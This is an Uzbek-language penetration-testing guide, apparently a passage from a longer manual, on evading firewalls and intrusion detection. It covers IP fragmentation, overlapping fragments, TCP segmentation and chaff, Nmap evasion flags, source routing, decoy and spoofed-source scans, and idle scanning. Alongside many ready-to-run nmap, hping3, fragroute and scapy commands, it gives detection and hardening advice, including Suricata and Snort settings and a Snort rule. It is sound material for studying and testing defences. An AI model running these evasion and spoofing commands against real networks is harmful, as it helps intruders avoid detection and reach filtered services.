Nmap’ning `-f` parametri IP sarlavhasidan keyingi ma’lumotni 8 baytgacha bo‘laklarga ajratadi. 20 baytlik TCP sarlavhasi uch bo‘lakka bo‘linadi: 8 + 8 + 4 bayt. Har bir bo‘lak o‘z IP sarlavhasiga ega. `-f` ikki marta berilsa (`-ff`) bo‘lak 16 bayt bo‘ladi. `--mtu` bilan o‘lchamni o‘zingiz belgilaysiz (masalan, `--mtu 24`); uni `-f` bilan birga ishlatmang.

### 4.2 Tiny fragment hujumi

**[HUJUM]** Birinchi bo‘lak shunchalik kichik qilinadiki, TCP flaglari (TCP sarlavhasining 13-bayti) ikkinchi bo‘lakka tushib qoladi. Faqat birinchi bo‘lakni tekshiradigan paket filtri paket SYN ekanini ko‘rmaydi, keyingi bo‘laklarda esa L4 sarlavhasi yo‘q, shuning uchun ular port qoidalariga bo‘ysunmay o‘tib ketadi. RFC 1858 bu hujumni va uning oldini olishni tavsiflaydi: TCP uchun offset’i 1 ga teng bo‘laklarni tashlash. RFC 3128 esa overlap yordamida qilinadigan variantini qo‘shimcha qiladi.

### 4.3 Ustma-ust bo‘laklar (overlapping fragments)

**[HUJUM]** Ikki bo‘lak bitta bayt oralig‘ini turli ma’lumot bilan qamrab oladi. Qaysi ma’lumot «g‘olib» bo‘lishi OS’ga bog‘liq. Agar IDS bir siyosat bilan, host boshqasi bilan yig‘sa, ular turli payload’ni ko‘radi. Novak (2005) tasnifi Snort va Suricata’dagi siyosat nomlarining asosi bo‘lgan:

| Siyosat | Qoida (qisqacha) | Tarixiy misollar |
| --- | --- | --- |
| `first` | Birinchi kelgan bo‘lak ustun. | Eski Windows, macOS, HP-UX 11 |
| `last` | Keyin kelgan bo‘lak ustun. | Cisco IOS |
| `bsd` | Asosan avvalgisi ustun, lekin keyingisi undan oldinroq offset’dan boshlansa, keyingisi. | FreeBSD, OpenBSD, AIX, IRIX |
| `bsd-right` | `bsd`’ning o‘ngga moyil varianti. | HP JetDirect printerlari |
| `linux` | `bsd`’ga yaqin, lekin bir xil offset’dagi keyingi bo‘lak ustun. | Eski Linux yadrolari |

> ℹ️ **ZAMONAVIY HOLAT**
>
> Yangi Linux yadrolari (2018-yildan) ustma-ust IPv4 bo‘lakli datagrammani butunlay tashlab yuboradi, IPv6’da esa RFC 5722 buni majburiy qiladi. Shuning uchun overlap texnikasi bugungi serverlarga qarshi kam ishlaydi, lekin eski tizimlar, printerlar, sanoat va IoT qurilmalarida hamon dolzarb. Pentestda bu usulning asosiy qiymati — IDS’ning target-based siyosati to‘g‘ri sozlanganini tekshirish.
>

### 4.4 TTL yordamida insertion

Ayrim bo‘laklar shunday TTL bilan yuboriladiki, ular IDSdan o‘tadi, lekin hostgacha yetib bormaydi. IDS soxta bo‘laklarni ham qo‘shib yig‘adi va noto‘g‘ri payload ko‘radi. Buning uchun avval traceroute bilan IDS va host orasidagi hoplar sonini taxmin qilish kerak. fragroute’dagi `ip_chaff <ttl>` va `tcp_chaff <ttl>` buyruqlari aynan shunday soxta paketlarni aralashtiradi.

### 4.5 Vositalar

#### Nmap

```bash
sudo nmap -sS -f -p 80,443 <nishon>          # 8 baytli bo‘laklar
sudo nmap -sS -ff -p 80,443 <nishon>         # 16 baytli bo‘laklar
sudo nmap -sS --mtu 24 -p 80,443 <nishon>    # 8 ga karrali bo‘lishi shart
sudo nmap -sS -f --send-eth -e eth0 <nishon> # OS qayta yig‘masligi uchun Ethernet darajasida
```

- Fragmentatsiya faqat Nmap’ning raw-paket funksiyalarida ishlaydi: SYN, UDP, ACK va boshqa raw skanlar, OS aniqlash. TCP connect (`-sT`), FTP bounce, versiya aniqlash (`-sV`) va NSE skriptlari OS’ning TCP stekidan foydalanadi, ularga `-f` ta’sir qilmaydi.
- Ba’zi tizimlar chiqayotgan bo‘laklarni yadroda qayta yig‘ib yuboradi (masalan, Linux conntrack moduli bilan). Skan paytida Wireshark yoki tcpdump bilan bo‘laklar haqiqatan chiqayotganini tekshiring; muammo bo‘lsa `--send-eth` ishlating.
- Ayrim dasturlar mayda bo‘laklarni noto‘g‘ri qayta ishlab, ishdan chiqishi mumkin. Ishlab turgan tizimda ehtiyot bo‘ling.

```bash
# Faqat bo‘laklarni ko‘rsatuvchi tcpdump filtri (MF bayrog‘i yoki offset nolga teng emas)
sudo tcpdump -ni eth0 'ip[6:2] & 0x3fff != 0'
```

#### hping3

```bash
sudo hping3 -S -p 80 -f -c 3 <nishon>            # paketni bo‘laklarga bo‘lish
sudo hping3 -S -p 80 -m 16 -c 3 <nishon>         # virtual MTU 16 bayt
sudo hping3 -S -p 80 -x -N 31337 -c 1 <nishon>   # MF bayrog‘i va aniq IP ID
sudo hping3 -S -p 80 -g 8 -x -c 1 <nishon>       # offset qiymatini qo‘lda berish
```

#### fragroute

fragroute (Dug Song) bitta nishon hostga ketayotgan chiquvchi trafikni tutib, qoida fayliga ko‘ra o‘zgartiradi va qayta yuboradi. Shu tufayli istalgan dastur (brauzer, curl, eksploit) trafigiga bo‘laklash va chaff qo‘llash mumkin.

```bash
# qoidalar.conf
ip_frag 8 old      # 8 baytli IP bo‘laklari; overlap’da eski ma’lumot ustun
ip_chaff dup       # boshqa payload’li dublikat bo‘laklarni aralashtirish
order random       # bo‘laklar tartibini aralashtirish
print              # natijani ekranga chiqarish

sudo fragroute -f qoidalar.conf <nishon-ip>
# boshqa terminalda: curl http://<nishon-ip>/
```

| fragroute buyrug‘i | Vazifasi |
| --- | --- |
| `ip_frag <o‘lcham> [old\|new]` | IP bo‘laklash; overlap’da eski yoki yangi ma’lumot ustun bo‘lishi. |
| `ip_chaff dup\|opt\|<ttl>` | Soxta IP paketlar: dublikat, noto‘g‘ri options yoki qisqa TTL bilan. |
| `tcp_seg <o‘lcham> [old\|new]` | TCP segmentlarga bo‘lish (session splicing, 5.1). |
| `tcp_chaff cksum\|null\|paws\|rexmit\|seq\|syn\|<ttl>` | Soxta TCP segmentlar: noto‘g‘ri checksum, flagsiz, eski timestamp, takroriy, noto‘g‘ri seq, SYN yoki qisqa TTL (5.3). |
| `order random\|reverse`, `delay`, `drop`, `dup` | Tartib, kechikish, tashlash va dublikat. |

#### Scapy

Laboratoriyada eng moslashuvchan vosita: istalgan bo‘lak, offset va overlap’ni qo‘lda yasash mumkin.

```python
from scapy.all import IP, TCP, fragment, send
pkt = IP(dst="10.10.10.20") / TCP(dport=80, flags="S")
send(fragment(pkt, fragsize=8))     # root huquqi kerak
```

### 4.6 IPv6: bo‘laklar va kengaytma sarlavhalar

IPv6’da asosiy sarlavha 40 bayt va qat’iy. Qo‘shimcha ma’lumot kengaytma sarlavhalar zanjirida keladi: Hop-by-Hop, Routing, Fragment, Destination Options va boshqalar. Zanjir uzun bo‘lsa, TCP/UDP sarlavhasi ikkinchi bo‘lakka tushib qolishi mumkin va stateless filtr port qoidasini qo‘llay olmaydi. RFC 7112 birinchi bo‘lakda butun sarlavha zanjiri bo‘lishini talab qiladi; RFC 5722 ustma-ust bo‘laklarni taqiqlaydi; IPv6’ning asosiy spetsifikatsiyasi RFC 8200.

```bash
sudo nmap -6 -sS -p 22,80,443 <ipv6-nishon>
# THC-IPv6 to‘plami (laboratoriya): firewall6 kengaytma sarlavhalar bilan qoidalarni sinaydi
sudo atk6-firewall6 eth0 <ipv6-nishon> 80
```

> 🛡️ **ANIQLASH VA HIMOYA: FRAGMENTATSIYA**
>
> - **Target-based yig‘ish.** Suricata’da OS siyosatini tarmoqlar bo‘yicha belgilang; Snort 3’da `stream_ip` siyosati va chegaralari:
>
> ```yaml
> # suricata.yaml (parcha)
defrag:
  memcap: 64mb
  timeout: 60
host-os-policy:
  windows: [10.0.10.0/24]
  linux:   [10.0.20.0/24]
  bsd:     []

-- snort.lua (parcha)
stream_ip =
{
    policy = 'linux',       -- himoyalanayotgan hostlarga mos siyosat
    max_overlaps = 2,       -- ko‘p overlap → alert
    min_frag_length = 100,  -- juda kichik bo‘lak → alert
    min_ttl = 3,
}
> ```
>
> - **Zeek** `weird.log`’da `fragment_overlap`, `excessively_small_fragment` kabi yozuvlarni kuzating.
> - **Perimetrda:** L4 sarlavhasi to‘liq bo‘lmagan birinchi bo‘laklarni va offset’i 1 bo‘lgan TCP bo‘laklarini tashlang (RFC 1858); firewall’da bo‘laklarni to‘liq yoki virtual qayta yig‘ishni yoqing (Linux conntrack buni avtomatik qiladi, pf’da `scrub`).
> - **IPv6:** to‘liq sarlavha zanjirisiz kelgan bo‘laklarni tashlang; kengaytma sarlavhalar sonini cheklang; IPv4 qoidalari bilan paritetni ta’minlang.
> - **Signal:** oddiy trafikda 8–16 baytli bo‘laklar deyarli bo‘lmaydi. Ularning paydo bo‘lishining o‘zi alert uchun asos.
>

## 5\. TCP darajasidagi usullar

Zamonaviy IDS’lar TCP oqimini qayta yig‘adi (stream reassembly), shuning uchun TCP darajasidagi evasion IP darajasidagidan ko‘ra yig‘ish mantiqidagi nozik farqlarga tayanadi.

### 5.1 Segmentatsiya va session splicing

**[HUJUM]** Payload juda kichik TCP segmentlarga, masalan, bittadan baytga bo‘linadi. Oqimni yig‘maydigan yoki har bir paketni alohida tekshiradigan IDS imzoni ko‘rmaydi. Klassik misol — HTTP so‘rovini bir necha bo‘lakka bo‘lish (manbada *session splicing* deb atalgan, libwhisker/Whisker vositalarida mavjud bo‘lgan). Ilg‘or variant: segmentlar orasida IDS’ning oqim timeout’idan uzoqroq, lekin server timeout’idan qisqaroq pauza qilish. IDS sessiyani «unutadi», server esa ulanishni ushlab turadi.

```bash
# fragroute bilan: har bir TCP segmentni 1 baytga bo‘lish
tcp_seg 1
order random
print
```

### 5.2 Ustma-ust segmentlar

Bo‘laklardagi kabi, lekin TCP ketma-ketlik raqamlari bo‘yicha. Ikki segment bir xil seq oralig‘ini turli baytlar bilan qamrab oladi; qaysi biri qabul qilinishi TCP stekiga bog‘liq. fragroute’da `tcp_seg 4 new`. Snort 3 `stream_tcp` va Suricata `stream` modullari host OS siyosatiga ko‘ra yig‘adi va overlap’dagi farqli ma’lumot haqida alert beradi.

### 5.3 Chaff: IDS qabul qiladigan, host tashlaydigan segmentlar

| Usul | Host nega tashlaydi | IDS qachon aldanadi |
| --- | --- | --- |
| Noto‘g‘ri TCP checksum | Checksum tekshiruvi | IDS checksumni tekshirmasa |
| Qisqa TTL | Paket hostgacha yetmaydi | IDS hoplar sonini bilmasa |
| Eski timestamp (PAWS) | RFC 7323 PAWS himoyasi | IDS PAWS’ni hisobga olmasa |
| Oynadan tashqari seq | Qabul oynasidan tashqarida | IDS oynani to‘g‘ri kuzatmasa |
| Soxta RST | Noto‘g‘ri checksum yoki seq aniq mos emas (RFC 5961) | IDS RST’ni ko‘rib sessiyani yopsa, keyingi hujum baytlarini kuzatmaydi |

Soxta RST alohida e’tiborga loyiq: IDS «ulanish yopildi» deb oqim holatini o‘chiradi, host esa RST’ni qabul qilmagan va ulanish davom etmoqda. RFC 5961 dan keyin hostlar RST’ni faqat aniq kutilgan seq bilan qabul qiladi; IDS ham xuddi shu qoidani qo‘llashi kerak.

### 5.4 Desinxronizatsiya, URG va boshqa holatlar

- **Pre-connection SYN.** Haqiqiy handshake’dan oldin soxta seq bilan SYN (masalan, qisqa TTL yoki noto‘g‘ri checksum bilan) yuboriladi; IDS noto‘g‘ri boshlang‘ich seq’ni eslab qoladi va keyingi oqimni noto‘g‘ri yig‘adi.
- **Post-connection SYN.** Ulanish o‘rnatilgandan keyin yangi seq bilan SYN; ayrim IDS’lar resinxronlashadi, host esa uni e’tiborsiz qoldiradi.
- **URG bayrog‘i.** Urgent pointer ko‘rsatgan baytni ba’zi steklar oqimdan chiqarib oladi, ba’zilari qoldiradi. RFC 6093 bu mexanizmni yangi ilovalarda ishlatmaslikni tavsiya qiladi; IDS uni normalizatsiya qilishi yoki alert berishi kerak.
- **SYN ichida ma’lumot.** Ruxsat etilgan, lekin kam uchraydi; steklar turlicha qayta ishlaydi (TCP Fast Open bundan mustasno).

> 🛡️ **ANIQLASH VA HIMOYA: TCP**
>
> - Oqimni host OS siyosatiga ko‘ra yig‘ish (`stream_tcp` `policy`, Suricata `host-os-policy`); uch tomonlama handshake’siz oqimlarni (midstream) cheklash.
> - Kichik segmentlar soni uchun chegara: Snort 3 `stream_tcp`’dagi `small_segments` sozlamasi; Suricata’ning `stream-events.rules` faylidagi qoidalarni yoqish.
> - Inline normalizatsiya: Snort 3 `normalizer` moduli; noto‘g‘ri checksumli paketlarni IPS’da tashlash (Suricata: `stream.checksum-validation: yes`).
> - Sensor tarmoq kartasidagi checksum offloading noto‘g‘ri «invalid checksum» alertlarini keltirib chiqarishi mumkin: capture interfeysida offloading’ni o‘chiring yoki `checksum-checks: auto` ishlating.
> - Oqim timeout’larini himoyalanayotgan serverlar timeout’idan qisqa qilmang.
>

## 6\. Nmap evasion arsenali

Bu bo‘lim Nmap’ning rasmiy «Firewall/IDS Evasion and Spoofing» bo‘limidagi parametrlarni amaliy cheklovlari va himoyachi ko‘radigan izlari bilan birga beradi.

### 6.1 Parametrlar jadvali

| Parametr | Nima qiladi | Cheklov | Himoyachi nimani ko‘radi |
| --- | --- | --- | --- |
| `-f`, `-ff`, `--mtu N` | Paketlarni 8/16/N baytli IP bo‘laklarga bo‘ladi. | Faqat raw skanlar; -sT, -sV, NSE’ga ta’sir qilmaydi. N 8 ga karrali. | Mayda bo‘laklar — kuchli anomaliya. |
| `-D d1,d2,ME,…`, `-D RND:N` | Skanni soxta manbali decoy paketlar bilan niqoblaydi. | -sV va -sT bilan ishlamaydi; decoylar ishlab turgan bo‘lishi kerak; ISP soxta manbani filtrlashi mumkin. | Bir nechta «skanerlovchi», lekin bir xil TTL (8.1). |
| `-S IP -e iface` | Manba IP’ni soxtalashtiradi. | Odatda `-Pn` kerak; javoblar sizga kelmaydi. | Soxta IP’dan skan; TTL/IPID nomuvofiqligi. |
| `-g N`, `--source-port N` | Manba portni belgilaydi (53, 20, 88…). | Raw skanlarda ishlaydi; DNS so‘rovlari, -sT, -sV, NSE va OS aniqlashga ta’sir qilmaydi. | Manba port 53, lekin DNS emas. |
| `--data`, `--data-string`, `--data-length N` | Paketga hex, matn yoki N bayt tasodifiy payload qo‘shadi. | -O probalariga ta’sir qilmaydi; `--data-length 0` protokolga xos payloadlarni ham o‘chiradi. | Payload’li SYN — o‘zi ham kam uchraydi. |
| `--ip-options` | R, T, U, L, S yoki hex ko‘rinishidagi IP options. | Ko‘p marshrutizatorlar options’li paketni tashlaydi. | IP options — kam uchraydigan, qoida bilan oson topiladigan belgi. |
| `--ttl N` | IPv4 TTL qiymatini belgilaydi. | Hoplar sonini bilish kerak. | Odatiy bo‘lmagan TTL. |
| `--randomize-hosts` | 16384 tagacha hostlik guruhlar ichida tartibni aralashtiradi. | Faqat tartibni o‘zgartiradi. | Ketma-ket IP’lar bo‘yicha naqsh yo‘qoladi. |
| `--spoof-mac` | Ethernet freymlarida MAC’ni almashtiradi (0, vendor nomi yoki aniq MAC). | Faqat bir L2 segmentda ma’noli; faqat raw skanlar. | Yangi/noma’lum MAC; NAC profilga mos emas. |
| `--proxies` | HTTP yoki SOCKS4 proksilar zanjiri orqali TCP ulanish. | Faqat NSE va -sV; ping, port skan, OS aniqlash proksidan o‘tmaydi va haqiqiy IP oshkor bo‘ladi. | Proksi IP; lekin port skan sizning IP’dan. |
| `--badsum` | Noto‘g‘ri TCP/UDP/SCTP checksum. | Hostlar javob bermaydi; razvedka uchun (3.5). | Noto‘g‘ri checksum — anomaliya. |
| `-sI zombi[:port]` | Idle skan: paketlarni zombi nomidan yuboradi. | Inkremental IPID’li bo‘sh zombi kerak (8.3). | Zombi IP’dan skan. |
| `-n`, `--send-eth` | DNS teskari so‘rovlarisiz; Ethernet darajasida yuborish. | — | Nishonning DNS loglarida iz kamroq. |

### 6.2 Vaqt va temp

| Shablon | Probalar orasidagi kutish | Qachon |
| --- | --- | --- |
| `-T0` paranoid | 5 daqiqa, parallel emas | IDS chegaralarini sinash; juda sekin |
| `-T1` sneaky | 15 soniya | Ehtiyotkor skan |
| `-T2` polite | 0,4 soniya | Nishonni kam yuklash |
| `-T3` normal | Dinamik (standart) | Oddiy holat |
| `-T4` / `-T5` | Qisqa timeout’lar, tez | Laboratoriya, ichki tarmoq; IDS uchun shovqinli |

Ko‘p port-skan detektorlari «T soniya ichida N ta port/host» tamoyilida ishlaydi. Masalan, chegara 60 soniyada 20 ta port bo‘lsa, `--scan-delay 4s` bilan bir daqiqada atigi 15 ta probe yuboriladi. Lekin narxini hisoblang: 256 host × 5 port = 1280 probe; `-T1` bilan 1280 × 15 s ≈ 5,3 soat. Uzoq oynada ishlaydigan SIEM korrelyatsiyasi yoki Zeek bunday sekin skanni baribir ko‘rishi mumkin.

```bash
sudo nmap -sS -n -Pn --scan-delay 4s --max-retries 1 --max-parallelism 1 \
  -p 22,80,443,445,3389 <nishon>
sudo nmap -sS -n -Pn -T1 --randomize-hosts -p 22,80,443,445,3389 10.10.10.0/24
```

Nmap portlar tartibini standart holatda o‘zi aralashtiradi (`-r` ketma-ket skanlashni yoqadi). `--max-rate` sekundiga paketlar sonini cheklaydi.

### 6.3 Manba port: ishonchga asoslangan qoidalar

Keng tarqalgan xato — trafikni faqat manba port bo‘yicha ishonchli deb hisoblash. Yangi firewall o‘rnatilgach DNS javoblari (manba port 53) yoki aktiv FTP (manba port 20) ishlamay qoladi va administrator «shu portlardan keladigan hamma narsani o‘tkaz» qoidasini qo‘yadi. Tarixiy misollar: Windows 2000/XP IPsec filtrlaridagi Kerberos (port 88) uchun yashirin qoida; ZoneAlarm 2.1.25 gacha bo‘lgan versiyalarning UDP 53 va 67 portlaridan kelgan paketlarni o‘tkazishi.

```bash
sudo nmap -sS -p 1-1000 -n <nishon>            # 1) oddiy
sudo nmap -sS -g 53 -p 1-1000 -n <nishon>      # 2) manba port 53
sudo nmap -sU -g 53 -p 161 -n <nishon>         # UDP uchun ham
sudo hping3 -S -s 53 -k -p 445 -c 3 <nishon>   # -s manba port, -k uni o‘zgarmas qilish
```

Ikki natija farq qilsa, topilma tasdiqlandi. Bu teshikdan amalda foydalanish uchun mijoz dasturi ham shu manba portdan ulanishi kerak, masalan: `ncat --source-port 53 <nishon> 445`. Skan faqat teshik borligini isbotlaydi.

### 6.4 Payload va paket o‘lchami

Nmap odatda faqat sarlavhadan iborat minimal paketlar yuboradi: TCP paketlari 40 bayt, ICMP echo 28 bayt. Ba’zi IDS imzolari skanerlarning aynan shu xususiyatlariga qaraydi. `--data-length` paketga tasodifiy baytlar qo‘shib, bu belgilarning bir qismini o‘zgartiradi; ammo Nmap SYN probalari baribir oddiy brauzer SYN’idan farq qiladi (TCP options to‘plami, window qiymati). Passiv fingerprint vositalari (masalan, p0f) bu farqni ko‘radi.

```bash
sudo nmap -sS --data-length 24 -p 80,443 -n <nishon>
sudo nmap -sS --data-string "PENTEST-2026-ACME ticket 4471" -p 80 -n <nishon>
```

Ikkinchi misol himoya maqsadida foydali: ruxsat etilgan testda paketlarga sinov identifikatorini yozib qo‘ysangiz, SOC jamoasi pcap’dan sizning trafikingizni ajrata oladi.

### 6.5 MAC manzilni almashtirish

```bash
sudo nmap -sS --spoof-mac 0 -n <nishon>          # tasodifiy MAC
sudo nmap -sS --spoof-mac Cisco -n <nishon>      # Cisco OUI + tasodifiy qism
sudo nmap -sS --spoof-mac 00:11:22:33:44:55 -n <nishon>
sudo ip link set dev eth0 address 00:11:22:33:44:55   # butun tizim uchun
```

MAC faqat bitta L2 segment ichida ahamiyatli: port security, MAC’ga asoslangan NAC, DHCP rezervatsiyalari. Marshrutizatordan keyin MAC almashadi. **[HIMOYA]** 802.1X, DHCP snooping, dinamik ARP inspeksiyasi, NAC profillash (MAC vendori bilan qurilma xatti-harakatini solishtirish).

### 6.6 Kam uchraydigan skan turlari

| Skan | Yuboriladigan flaglar | Mantiq va qachon foydali |
| --- | --- | --- |
| `-sN` NULL | hech qaysi flag | RFC 793/9293 bo‘yicha yopiq port RST qaytaradi, ochiq port javob bermaydi (open\|filtered). Faqat SYN’ni bloklaydigan stateless filtrdan o‘tishi mumkin. Windows va ayrim qurilmalar har doim RST yuboradi, shuning uchun barcha portlar «closed» ko‘rinadi. |
| `-sF` FIN | FIN | RFC 793/9293 bo‘yicha yopiq port RST qaytaradi, ochiq port javob bermaydi (open\|filtered). Faqat SYN’ni bloklaydigan stateless filtrdan o‘tishi mumkin. Windows va ayrim qurilmalar har doim RST yuboradi, shuning uchun barcha portlar «closed» ko‘rinadi. |
| `-sX` Xmas | FIN, PSH, URG | RFC 793/9293 bo‘yicha yopiq port RST qaytaradi, ochiq port javob bermaydi (open\|filtered). Faqat SYN’ni bloklaydigan stateless filtrdan o‘tishi mumkin. Windows va ayrim qurilmalar har doim RST yuboradi, shuning uchun barcha portlar «closed» ko‘rinadi. |
| `-sM` Maimon | FIN/ACK | Ayrim eski BSD tizimlari ochiq portda paketni tashlaydi. |
| `-sA`, `-sW` | ACK | Filtr qoidalarini xaritalash (3.2). |
| `-sO` | IP protokol raqamlari | Qaysi IP protokollari (GRE, ESP, SCTP…) o‘tishini aniqlash. |
| `-sY` | SCTP INIT | SCTP ishlatadigan telekom muhitlari. |

### 6.7 Kombinatsiya va metodologiya

```bash
sudo nmap -sS -Pn -n \
  -f --data-length 24 \
  -g 53 \
  -D 10.10.10.23,10.10.10.41,ME,10.10.10.57 \
  --randomize-hosts -T2 --max-retries 1 \
  -p 22,80,443,445,3389 \
  -oA natija/evasion-test \
  10.10.10.0/24
```

> ⚠️ **METODOLOGIYA**
>
> Barcha parametrlarni birdaniga qo‘shmang. Avval baseline skan qiling va IDS alertlarini sanang, keyin har bir parametrni alohida qo‘shib, natijani o‘lchang (A/B test). Aks holda qaysi usul ishlaganini va hisobotda nimani tavsiya qilishni bilmaysiz. Har bir sinovni `-oA` bilan saqlang va vaqtini qayd eting: SOC loglari bilan solishtirish uchun kerak.
>

### 6.8 NSE skriptlari

```bash
sudo nmap --script ipidseq -p 80 <zombi-nomzod>     # idle skan uchun zombi qidirish
sudo nmap --script firewalk --traceroute <nishon>    # firewalking (3.3)
sudo nmap --script firewall-bypass <nishon>          # ALG/helper zaifligi
sudo nmap --script firewall-bypass \
  --script-args firewall-bypass.helper="ftp",firewall-bypass.targetport=22 <nishon>
```

`firewall-bypass` stateful firewall’ning protokol yordamchisini (masalan, FTP helper/ALG) aldab, dinamik ravishda port ochtirishga urinadi. Zamonaviy Linux yadrolarida helperlarni avtomatik tayinlash o‘chirilgan, shuning uchun bu usul asosan eski yoki noto‘g‘ri sozlangan qurilmalarda ishlaydi.

## 7\. Manba belgilaydigan marshrut (source routing)

Source routing (path addressing) — jo‘natuvchi paket manzilga yetish yo‘lida qaysi tugunlardan o‘tishi kerakligini IPv4 sarlavhasining Options maydonida ko‘rsatishi. G‘oya: agar to‘g‘ridan-to‘g‘ri yo‘lda firewall tursa, paketni boshqa, filtrlanmagan yo‘l orqali yuborish.

### 7.1 IPv4 options turlari

| Option | Turi (kod) | Ma’nosi |
| --- | --- | --- |
| Loose Source and Record Route (LSRR) | 131 (0x83) | Ko‘rsatilgan oraliq manzillar orqali o‘tish shart, ular orasida boshqa marshrutizatorlar ham bo‘lishi mumkin. |
| Strict Source and Record Route (SSRR) | 137 (0x89) | Yo‘ldagi har bir tugun ketma-ket ko‘rsatilishi shart. |
| Record Route (RR) | 7 | Har bir marshrutizator o‘z manzilini yozadi; yo‘lni aniqlash uchun. |
| Timestamp | 68 | Vaqt belgilari (va manzillar) yoziladi. |

Options maydoni ko‘pi bilan 40 bayt, shuning uchun marshrutga 9 tagacha IPv4 manzil sig‘adi. Tarixan source routing va IP soxtalashtirish birga ishlatilgan: hujumchi ishonchli host nomidan paket yuborib, marshrutni o‘zi orqali qaytarishni so‘ragan va javoblarni ko‘ra olgan. Aynan shu sababli bugun bu options deyarli hamma joyda bloklanadi.

### 7.2 Nmap bilan

```bash
# Erkin marshrut: ko‘rsatilgan tugunlar orqali
sudo nmap -sS -p 80 --ip-options "L 192.168.0.7 192.168.30.9" --packet-trace <nishon>
# Qat’iy marshrut: barcha oraliq tugunlar ketma-ket
sudo nmap -sS -p 80 --ip-options "S 192.168.0.7 192.168.0.9 192.168.30.9" <nishon>
# Record route: traceroute ishlamaganda yo‘lni ko‘rish
sudo nmap -sS -p 80 --ip-options R --packet-trace <nishon>
# T — timestamp, U — record route va timestamp birga
sudo nmap -sS -p 80 --ip-options U --packet-trace <nishon>
```

Options’ni xom hex ko‘rinishida ham berish mumkin: har bir bayt `\x` va ikki raqam bilan, takrorlash `*N` bilan yoziladi (Nmap qo‘llanmasidagi namunada `\x00*36` — 36 ta nol bayt). Bu usul RFC’dagi har qanday option’ni, shu jumladan noto‘g‘ri tuzilganini ham yasash imkonini beradi.

1.0 versiyadagi SSRR misolidagi «..» belgisi Nmap sintaksisining qismi emas: u asl matnda tushirib qoldirilgan tugunlarni bildirgan. Haqiqiy buyruqda barcha manzillar to‘liq yozilishi kerak.

### 7.3 Hozirgi holat va IPv6

- RFC 7126 LSRR va SSRR options’li paketlarni standart holatda tashlashni tavsiya qiladi; deyarli barcha ISP va korporativ marshrutizatorlar shunday qiladi.
- IPv6’dagi Type 0 Routing Header (RH0) trafikni kuchaytirish xavfi tufayli RFC 5095 bilan bekor qilingan. Segment Routing Header (SRv6, RFC 8754) esa faqat operator tarmog‘i ichida ishlatilishi va chegarada filtrlanishi kerak.
- **Pentest qiymati:** agar perimetrdan source routing options’li paketlar o‘tsa, bu o‘z-o‘zidan topilma. Record Route esa marshrutni aniqlashda hamon foydali.

> 🛡️ **HIMOYA: SOURCE ROUTING**
>
> ```bash
> # Linux
sysctl -w net.ipv4.conf.all.accept_source_route=0
sysctl -w net.ipv6.conf.all.accept_source_route=0
# Cisco IOS
no ip source-route
# Windows (registry): HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters
#   DisableIPSourceRouting = 2
# Snort/Suricata qoidasi
alert ip any any -> $HOME_NET any (msg:"LOCAL IP option LSRR"; ipopts:lsrr; sid:1000001; rev:1;)
> ```
>

## 8\. Decoy, soxtalashtirish va idle skan

### 8.1 Chalg‘ituvchi manzillar (decoy) bilan skanerlash

**[HUJUM]** Barcha paketlar skanerlayotgan mashinadan chiqadi, lekin ayrimlarining manba IP manzili almashtiriladi. Kuzatuvchiga bir nechta manzil skanerlayotgandek ko‘rinadi. Bu nishon haqida qo‘shimcha ma’lumot bermaydi va skanni sekinlashtiradi; maqsad — haqiqiy manbani yashirish.

```bash
sudo nmap -sS -D 10.10.10.23,10.10.10.41,ME,10.10.10.57 -p 1-1000 <nishon>
sudo nmap -sS -D RND:10 -p 1-1000 <nishon>
```

- `ME` haqiqiy manzilingiz o‘rni. Uni 6-o‘rin yoki undan keyin qo‘ysangiz, ayrim oddiy port-skan detektorlari (masalan, Scanlogd) haqiqiy IP’ni umuman ko‘rsatmasligi mumkin. `ME` berilmasa, Nmap uni tasodifiy o‘ringa qo‘yadi.
- `RND:N` N ta tasodifiy, rezerv qilinmagan IPv4 manzil yaratadi (faqat IPv4).
- **Decoylar ishlab turgan hostlar bo‘lishi kerak.** Aks holda nishonga beixtiyor SYN flood qilasiz. Agar ro‘yxatdagi manzillardan faqat bittasi tirik bo‘lsa, kim skanerlayotgani darhol ma’lum bo‘ladi.
- Decoylar host discovery, port skan va OS aniqlash (`-O`) bosqichlarida ishlatiladi; versiya aniqlash (`-sV`) va TCP connect skan (`-sT`) bilan ishlamaydi. Keyingi `-sV` skan sizni oshkor qiladi.
- Domen nomlari o‘rniga IP ishlating: aks holda decoy tarmoqlarining DNS loglarida iz qoldirasiz. Ba’zi ISP’lar soxta manbali paketlarni chiqarmaydi.

> ℹ️ **FORENZIKA: DECOYNI QANDAY FOSH QILISH MUMKIN**
>
> Barcha decoy paketlari bitta mashinadan chiqqani uchun nishonga ular **bir xil TTL** bilan yetib keladi. Haqiqiy, turli joylardagi hostlar esa turli hoplar sonida bo‘ladi. Agar «turli mamlakatlardan» kelgan beshta skanerning TTL qiymati bir xil bo‘lsa, ular bitta manbadan. Bundan tashqari, decoy IP’larga qaytgan SYN/ACK’larga ular RST bilan javob beradi (chunki hech narsa yubormagan), haqiqiy skaner esa boshqacha xatti-harakat qiladi. Router yo‘lini kuzatish va javoblarni tashlash orqali ham haqiqiy manba aniqlanadi.
>

### 8.2 IP manzilni soxtalashtirish

IP spoofing — paket boshqa qurilmadan kelgandek ko‘rinishi uchun IP sarlavhasidagi manba manzilini almashtirish. Javob paketni haqiqatan yuborgan qurilmaga emas, sarlavhadagi manzilga ketadi. Shu sababli ulanishga asoslangan skanlar natija bermaydi; usul asosan ko‘r (blind) holatlarda, DoS hujumlarida (manbada misol qilingan) va idle skanda ishlatiladi.

```bash
sudo nmap -sS -S <soxta-ip> -e eth0 -Pn -p 80 <nishon>
sudo hping3 -S -p 80 -a <soxta-ip> -c 3 <nishon>
```

**Himoyachi uchun qonuniy foydalanish:** o‘z tarmog‘ingiz soxta manbali paketlarni tashqariga chiqarayotganini tekshirish (BCP 38 sinovi). CAIDA Spoofer loyihasi (`spoofer.caida.org`) shu maqsadda vosita taqdim etadi.

### 8.3 Idle (zombi) skan

**[HUJUM]** Idle skan nishonga sizning IP’ingizdan birorta ham paket yubormasdan port holatini aniqlaydi. U «zombi» hostning IP identifikatori ketma-ket oshib borishiga tayanadi: zombi har bir paket yuborganda IPID 1 ga oshadi. Usulni 1998-yilda antirez (hping muallifi) e’lon qilgan.

<figure style="background:#fff;border:1px solid #e4e7ec;border-radius:8px;padding:14px;margin:1.5rem 0;overflow-x:auto">
<svg style="width:100%;height:auto" font-family="DejaVu Sans" font-size="10.5" viewbox="0 0 680 330" xmlns="http://www.w3.org/2000/svg">
